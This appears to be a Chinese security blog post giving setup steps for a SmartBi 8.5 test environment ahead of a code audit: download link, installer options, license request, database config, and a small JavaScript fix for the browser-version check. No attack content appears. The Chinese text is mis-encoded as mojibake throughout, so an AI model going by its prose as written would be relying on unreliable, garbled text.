

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head><!-- hexo injector head_begin start --><progress id="content_progress" value="0"></progress><!-- hexo injector head_begin end -->
  <meta charset="UTF-8">
  
  <link rel="apple-touch-icon" sizes="76x76" href="/img/pig.png">
  <link rel="icon" href="/img/pig.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#3F4B3B">
  <meta name="author" content="Piggy Sprint">
  <meta name="keywords" content="">
  
    <meta name="description" content="SmartBi-8.5æ­å»º&amp;&amp;å®¡è®¡">
<meta property="og:type" content="article">
<meta property="og:title" content="SmartBi-8.5æ­å»º&amp;&amp;å®¡è®¡">
<meta property="og:url" content="http://example.com/2025/10/27/SmartBi-8.5%E6%90%AD%E5%BB%BA&&%E5%AE%A1%E8%AE%A1/index.html">
<meta property="og:site_name" content="Piggy Sprint&#39;s blog">
<meta property="og:description" content="SmartBi-8.5æ­å»º&amp;&amp;å®¡è®¡">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173227241.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173344611.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173349208.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173227245.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173357836.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173420964.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173422702.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173424539.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173427621.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173431155.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173432983.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173434902.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173437858.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173440049.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173441869.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173442903.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173447060.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173448639.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173450003.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173451624.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173454054.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173457556.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173458919.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173501931.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173504653.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173506011.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173507432.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173509318.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173511109.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173514363.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173600292.png">
<meta property="og:image" content="c:\Users\95227\Desktop\image-20250812184549730.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173517313.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173518704.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173520026.png">
<meta property="og:image" content="c:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250812184756424.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173521845.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173527813.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173531532.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173534696.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173537603.png">
<meta property="article:published_time" content="2025-10-27T09:38:00.000Z">
<meta property="article:modified_time" content="2025-10-27T09:38:33.875Z">
<meta property="article:author" content="Piggy Sprint">
<meta property="article:tag" content="Javaä»£ç å®¡è®¡">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173227241.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>SmartBi-8.5æ­å»º&amp;&amp;å®¡è®¡ - Piggy Sprint&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />




  
<link rel="stylesheet" href="/custom/LoadingBar/pace-theme-barber-shop.css">
<link rel="stylesheet" href="/css/cloudedGlass.css">
<link rel="stylesheet" href="/custom/ReadingProgress/ReadingProgress.css">
<link rel="stylesheet" href="/css/Loadanimation.css">
<link rel="stylesheet" href="/css/StrongInDark.css">
<link rel="stylesheet" href="/css/TitleNeon.css">
<link rel="stylesheet" href="/css/TitleGradient.css">
<link rel="stylesheet" href="/css/ScrollBar.css">
<link rel="stylesheet" href="https://lib.baomitu.com/font-awesome/6.1.2/css/all.min.css">
<link rel="stylesheet" href="/css/CodeBlock.css">
<link rel="stylesheet" href="/css/CodeInLine.css">
<link rel="stylesheet" href="/css/Sidebar.css">
<link rel="stylesheet" href="/css/RandomBanner.css">
<link rel="stylesheet" href="/css/scrollAnimation.css">
<link rel="stylesheet" href="/css/Background.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":false,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","app_key":"byZ7eSN7DH9MXIyDyXwXE8SE","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
  <script src="/js/backgroundize.js"></script>
  <script src="/js/injector.js"></script>
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css">
<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style>
    <style>
    .code-expand-btn:not(.expand-done) ~ div.codeblock,
    .code-expand-btn:not(.expand-done) ~ * div.codeblock {
      overflow: hidden;
      height: 360px;
    }
    </style>
  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>


<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
  <div id="loader-container"> 
    <div id="loader" class="loader"></div>
    <div class="loader-inner">
        <div class="loader-line-wrap">
            <div class="loader-line"></div>
        </div>
        <div class="loader-line-wrap">
            <div class="loader-line"></div>
        </div>
        <div class="loader-line-wrap">
            <div class="loader-line"></div>
        </div>
        <div class="loader-line-wrap">
            <div class="loader-line"></div>
        </div>
        <div class="loader-line-wrap">
            <div class="loader-line"></div>
        </div>
    </div>
</div>

<script src="/js/RainbowLoading.js" type="text/javascript"></script>
<link href="/css/RainbowLoading.css" type="text/css" rel="stylesheet"/>

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong class="navbar-title"> ğŸ½ğŸ½ Piggy Sprint &#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/banner/random.webp') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="SmartBi-8.5æ­å»º&amp;&amp;å®¡è®¡"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-10-27 17:38" pubdate>
          2025å¹´10æœˆ27æ—¥ ä¸‹åˆ
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.8k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          41 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> æ¬¡
        </span>
        
      
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">SmartBi-8.5æ­å»º&amp;&amp;å®¡è®¡</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="SmartBi-8-5æ­å»º"><a href="#SmartBi-8-5æ­å»º" class="headerlink" title="SmartBi-8.5æ­å»º"></a>SmartBi-8.5æ­å»º</h1><h2 id="ä¸€ã€ä¸‹è½½"><a href="#ä¸€ã€ä¸‹è½½" class="headerlink" title="ä¸€ã€ä¸‹è½½"></a>ä¸€ã€ä¸‹è½½</h2><p>é€šè¿‡ç½‘ç›˜åˆ†äº«çš„æ–‡ä»¶ï¼šSmartBi-8.5ç¯å¢ƒ.zip<br>é“¾æ¥: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1bFYYEI9-g84IeLG_HoZlxA">https://pan.baidu.com/s/1bFYYEI9-g84IeLG_HoZlxA</a> æå–ç : hqb4</p>
<h2 id="äºŒã€å®‰è£…"><a href="#äºŒã€å®‰è£…" class="headerlink" title="äºŒã€å®‰è£…"></a>äºŒã€å®‰è£…</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173227241.png" srcset="/img/loading.gif" lazyload alt="image-20250821000100076"></p>
<p> ç”¨æˆ·åå’Œå…¬å¸åç§°éšæ„ </p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173344611.png" srcset="/img/loading.gif" lazyload alt="image-20250821000110498"></p>
<p>æ›´æ”¹å®‰è£…ç›®å½• </p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173349208.png" srcset="/img/loading.gif" lazyload alt="image-20250821000121312"></p>
<p>æ­¤å¤„ï¼Œä¸è¦é€‰æ‹©â€œå®‰è£…æ¼”ç¤ºåº“â€ï¼Œå¦åˆ™ä¼šæŠ¥â€œæŠ¥è¡¨æ•°é‡è¶…è¿‡é™åˆ¶â€çš„é”™è¯¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173227245.png" srcset="/img/loading.gif" lazyload alt="image-20250821000144553"></p>
<p>ä¸é€‰æ‹©â€œæ³¨å†Œä¸ºWindowsæœåŠ¡â€ï¼Œå†…å­˜å¤§å°é»˜è®¤å³å¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173357836.png" srcset="/img/loading.gif" lazyload alt="image-20250821000156009"></p>
<p> ç™»å½•é¦–é¡µçš„å¯†ç  </p>
<h2 id="ä¸‰ã€licenseè·å–"><a href="#ä¸‰ã€licenseè·å–" class="headerlink" title="ä¸‰ã€licenseè·å–"></a>ä¸‰ã€licenseè·å–</h2><p>  å®˜ç½‘åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://www.smartbi.com.cn/">https://www.smartbi.com.cn/</a> </p>
<p>licenseç”³è¯·åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html">https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html</a> </p>
<p>è¿™é‡Œç¬¬ä¸€æ¬¡è¿›å…¥éœ€è¦æ³¨å†Œ\ç™»å½•ï¼š</p>
<p>ä¹‹åä¾¿å¯ä»¥ç”³è¯·äº†ï¼Œé‚®ç®±è¦å¡«æ­£ç¡®ï¼Œä¹‹åä¼šå°† license å‘åˆ°é‚®ç®±é‡Œ</p>
<p>é€‰æ‹©ä¸ªäººç‰ˆ</p>
<p>ä¹‹ååœ¨é‚®ç®±é‡Œå¯ä»¥çœ‹åˆ°å‘çš„ï¼šSmartbi-License.xml </p>
<p>è·å– licence åï¼Œå°†å…¶æ”¾ç½®åœ¨ E:\Smartbi\Tomcat\bin æ–‡ä»¶å¤¹ ä¸‹</p>
<h2 id="å››ã€åˆ›å»ºæ•°æ®åº“"><a href="#å››ã€åˆ›å»ºæ•°æ®åº“" class="headerlink" title="å››ã€åˆ›å»ºæ•°æ®åº“"></a>å››ã€åˆ›å»ºæ•°æ®åº“</h2><p>é¦–å…ˆè¿æ¥ Smartbi ï¼š</p>
<p>åˆ›å»º Smartbi æ•°æ®åº“ï¼š </p>
<p>ç¬¬ä¸€æ­¥è¿æ¥å¥½ä¹‹åï¼Œæ˜¯æ²¡æœ‰ smartbi æ•°æ®åº“çš„ï¼Œéœ€è¦è‡ªå·±åˆ›å»º  </p>
<p>ä¸‹é¢æ˜¯ MySQL çš„é…ç½®ï¼š database-name åœ¨é€‰æ‹©å®‰è£…â€œæ¼”ç¤ºæ•°æ®åº“â€æ—¶æ˜¯ï¼š smartbidemo ï¼›å’‹ä»¬æ²¡æœ‰é€‰æ‹©ï¼Œæ‰€ä»¥é»˜è®¤æ˜¯ï¼š smartbi</p>
<p>E:\Smartbi\Tomcat\bin\smartbi-config.xml </p>
<ul>
<li><p>è§£å†³æµè§ˆå™¨ç‰ˆæœ¬è¯¯åˆ¤  </p>
<p>è¿™ä¸€æ­¥å¯ä»¥çœ‹ä¸‹é¢é—®é¢˜ä¸­çš„ 1ã€</p>
</li>
</ul>
<h2 id="äº”ã€å¯åŠ¨ç¨‹åº"><a href="#äº”ã€å¯åŠ¨ç¨‹åº" class="headerlink" title="äº”ã€å¯åŠ¨ç¨‹åº"></a>äº”ã€å¯åŠ¨ç¨‹åº</h2><h3 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h3><p>E:\Smartbi\Tomcat\bin\startup.cmd </p>
<p>è¿è¡Œ startup.cmd ï¼Œå¯åŠ¨æœåŠ¡å™¨  </p>
<h3 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h3><p>ç³»ç»Ÿå¼€å§‹èœå•ä¸­æ‰¾åˆ° Smartbi çš„å®‰è£…ç›®å½•ï¼Œå•å‡»å¯åŠ¨SmartbiæœåŠ¡</p>
<p>æ²¡æœ‰æŠ¥é”™çš„è¯ï¼Œå°±æ˜¯å¯åŠ¨æˆåŠŸäº†ï¼Œ è‹¥åˆ°è¿™ä¸€æ­¥æœåŠ¡å¯åŠ¨æœ‰é”™ï¼Œé‡å¯ç”µè„‘ï¼ï¼ï¼</p>
<h2 id="å…­ã€é…ç½®ç¨‹åº"><a href="#å…­ã€é…ç½®ç¨‹åº" class="headerlink" title="å…­ã€é…ç½®ç¨‹åº"></a>å…­ã€é…ç½®ç¨‹åº</h2><p>è®¿é—®Smartbi:é¦–æ¬¡è®¿é—®ï¼Œéœ€è¾“å…¥å¯†ç ï¼Œè¿™é‡Œçš„å¯†ç éšæ„ï¼Œæˆ‘çš„æ˜¯ admin</p>
<p> æ¥ä¸‹æ¥çš„é…ç½®æŒ‰ç…§å›¾ä¸­æ‰€ç¤ºå³å¯ï¼š</p>
<h2 id="ä¸ƒã€è¿›å…¥ä¸»é¡µ"><a href="#ä¸ƒã€è¿›å…¥ä¸»é¡µ" class="headerlink" title="ä¸ƒã€è¿›å…¥ä¸»é¡µ"></a>ä¸ƒã€è¿›å…¥ä¸»é¡µ</h2><p>  é‡å¯æœåŠ¡åï¼Œå†æ¬¡ç‚¹å‡» è®¿é—®Smartbi ï¼Œä¼šè¿›å…¥ä¸‹æ–¹é¡µé¢ï¼š</p>
<p><a target="_blank" rel="noopener" href="http://localhost:18080/smartbi/vision/index.jsp">http://localhost:18080/smartbi/vision/index.jsp</a> </p>
<p>é¦–æ¬¡è®¿é—®ç™»å½•é¡µï¼š</p>
<p> æ­¤å¤„çš„æ—§å¯†ç æ˜¯ manager ï¼Œä¹‹åè‡ªè¡Œä¿®æ”¹ä¸€ä¸ªæ–°å¯†ç ï¼š</p>
<p> è¿™æ˜¯ä¹‹åè®¿é—®ç™»å½•é¡µï¼šç™»å½•ç³»ç»Ÿï¼š</p>
<p>  è‡³æ­¤ï¼ŒSmartbi v8.5 ç¯å¢ƒæ­å»ºå®Œæˆã€‚</p>
<h2 id="æ‰€é‡é—®é¢˜"><a href="#æ‰€é‡é—®é¢˜" class="headerlink" title="æ‰€é‡é—®é¢˜"></a>æ‰€é‡é—®é¢˜</h2><p>ï¼ˆæŒ‰ç…§ä¸Šè¿°æ–¹æ³•å®‰è£…ååº”è¯¥ ä¸ä¼šæœ‰ä¸‹åˆ—é—®é¢˜ï¼‰ï¼š </p>
<h3 id="1ã€æµè§ˆå™¨ç‰ˆæœ¬è¢«é”™è¯¯æ£€æµ‹"><a href="#1ã€æµè§ˆå™¨ç‰ˆæœ¬è¢«é”™è¯¯æ£€æµ‹" class="headerlink" title="1ã€æµè§ˆå™¨ç‰ˆæœ¬è¢«é”™è¯¯æ£€æµ‹"></a>1ã€æµè§ˆå™¨ç‰ˆæœ¬è¢«é”™è¯¯æ£€æµ‹</h3><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.xiaoheiwoo.com/windows-11-internet-explorer/">https://www.xiaoheiwoo.com/windows-11-internet-explorer/</a> </p>
<p>æ–¹æ³•ä¸€ï¼š</p>
<p>ä»â€œç®¡ç†åŠ è½½é¡¹â€çª—å£æ‰“å¼€ Internet Explorer </p>
<p>IEä¸­æ˜¯å¯ä»¥é€šè¿‡ Internetå±æ€§ çª—å£ï¼Œå¯¹æµè§ˆå™¨è¿›è¡ŒåŠŸèƒ½è®¾ç½®çš„ã€‚</p>
<p>è™½ç„¶ Win11é»˜è®¤æ‰¾ä¸åˆ° IEçš„å…¥å£ï¼Œä½†æ˜¯ Internetå±æ€§ ç¨‹åºä¾ç„¶å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œæˆ‘ä»¬å¯ä»¥ç‚¹å‡»å…¶ä¸­çš„ ç®¡ ç†åŠ è½½é¡¹ åŠŸèƒ½ï¼Œæ‰“å¼€ IE æµè§ˆå™¨ã€‚</p>
<p> æ­¥éª¤ï¼š</p>
<ol>
<li><p>é¦–å…ˆï¼ŒæŒ‰ Win + R æ‰“å¼€è¿è¡Œçª—å£</p>
</li>
<li><p>æ¥ä¸‹æ¥ï¼Œåœ¨è¿è¡Œå‘½ä»¤æ¡†ä¸­è¾“å…¥ inetcpl.cpl </p>
</li>
<li><p>å•å‡» ç¡®å®š è¿›å…¥ Internet å±æ€§çª—å£</p>
</li>
<li><p>é€‰æ‹© ç¨‹åº é€‰é¡¹å¡ï¼Œç‚¹å‡» ç®¡ç†åŠ è½½é¡¹ æŒ‰é’®</p>
</li>
<li><p>ç„¶åï¼Œç‚¹å‡»çª—å£åº•éƒ¨ äº†è§£æœ‰å…³å·¥å…·æ å’Œæ‰©å±•çš„è¯¦ç»†ä¿¡æ¯</p>
</li>
<li><p>é“›é“›é“›ï¼Œä½ è¦çš„ IEæµè§ˆå™¨å‡ºç°å•¦~</p>
</li>
</ol>
<p>æ–¹æ³•äºŒï¼šæ³¨é‡Šæ‰åˆ¤æ–­è¯­å¥</p>
<p>è¿›å…¥ E:\Smartbi\Tomcat\webapps\smartbi\vision </p>
<p>æ‰¾åˆ°æ–‡ä»¶ config.jsp </p>
<p>å°†åˆ¤æ–­éƒ¨åˆ†æ³¨é‡Šæ‰  </p>
<h3 id="2ã€æŠ¥è¡¨æ•°é‡è¶…è¿‡é™åˆ¶"><a href="#2ã€æŠ¥è¡¨æ•°é‡è¶…è¿‡é™åˆ¶" class="headerlink" title="2ã€æŠ¥è¡¨æ•°é‡è¶…è¿‡é™åˆ¶"></a>2ã€æŠ¥è¡¨æ•°é‡è¶…è¿‡é™åˆ¶</h3><p>æŠ¥è¿™ä¸ªé—®é¢˜æ˜¯ç”±äºå®‰è£…æ—¶é€‰æ‹©äº†å®‰è£… æ¼”ç¤ºæ•°æ®åº“ ï¼Œä¸å®‰è£…å³å¯ã€‚</p>
<h3 id="3ã€é…ç½®å®Œæˆåæ— æ³•æ­£ç¡®è®¿é—®åˆ°ç™»é™†é¡µé¢ï¼Œä¸€ç›´é‡å®šå‘åˆ°é…-ç½®é¡µ"><a href="#3ã€é…ç½®å®Œæˆåæ— æ³•æ­£ç¡®è®¿é—®åˆ°ç™»é™†é¡µé¢ï¼Œä¸€ç›´é‡å®šå‘åˆ°é…-ç½®é¡µ" class="headerlink" title="3ã€é…ç½®å®Œæˆåæ— æ³•æ­£ç¡®è®¿é—®åˆ°ç™»é™†é¡µé¢ï¼Œä¸€ç›´é‡å®šå‘åˆ°é… ç½®é¡µ"></a>3ã€é…ç½®å®Œæˆåæ— æ³•æ­£ç¡®è®¿é—®åˆ°ç™»é™†é¡µé¢ï¼Œä¸€ç›´é‡å®šå‘åˆ°é… ç½®é¡µ</h3><p>é—®é¢˜ï¼š </p>
<p>å¦‚å›¾ï¼ŒçŸ¥è¯†åº“è¿æ¥æˆåŠŸï¼Œlicenseä¸Šä¼ æˆåŠŸã€‚é‡å¯åè®¿é—® <a target="_blank" rel="noopener" href="http://localhost:18080/smartbi">http://localhost:18080/smartbi</a> ä»ç„¶è·³è½¬åˆ°é… ç½®é¡µé¢ <a target="_blank" rel="noopener" href="http://localhost:18080/smartbi/vision/config.jsp%E3%80%82">http://localhost:18080/smartbi/vision/config.jspã€‚</a></p>
<p> é…ç½®å®Œæˆåå†æ¬¡ç™»å½•ï¼Œæ˜¾ç¤ºæœåŠ¡å¯åŠ¨ä¸æˆåŠŸï¼š </p>
<p> æ•°æ®åº“æ­£å¸¸è¿æ¥ï¼š</p>
<p> <strong>æ­£å¸¸è®¿é—®è·³è½¬çš„é¡µé¢ï¼š</strong></p>
<p><a target="_blank" rel="noopener" href="http://localhost:18080/smartbi/vision/index.jsp">http://localhost:18080/smartbi/vision/index.jsp</a> </p>
<p><a target="_blank" rel="noopener" href="http://localhost:18080/smartbi/vision">http://localhost:18080/smartbi/vision</a> </p>
<p><a target="_blank" rel="noopener" href="http://localhost:18080/smartbi">http://localhost:18080/smartbi</a> </p>
<p>éƒ½ä¼šé‡å®šå‘åˆ° <a target="_blank" rel="noopener" href="http://localhost:18080/smartbi/vision/config.jsp">http://localhost:18080/smartbi/vision/config.jsp</a>   </p>
<p>ä¿®æ”¹ï¼š</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">//var chromeVer = ua.substr(chrome + 7,2);</span></span>
<span class="line"><span style="color: #abb2bf">-&gt;</span></span>
<span class="line"><span style="color: #abb2bf">var match = ua.match(/chrome\/(\d+)/i);</span></span>
<span class="line"><span style="color: #abb2bf">var chromeVer = match ? parseInt(match[1]) : 0;</span></span></code></pre></div></div></figure>

<p>èƒ½æ­£ç¡®è¯†åˆ«æµè§ˆå™¨ç‰ˆæœ¬ï¼Œä½†æ²¡ä»€ä¹ˆç”¨ </p>
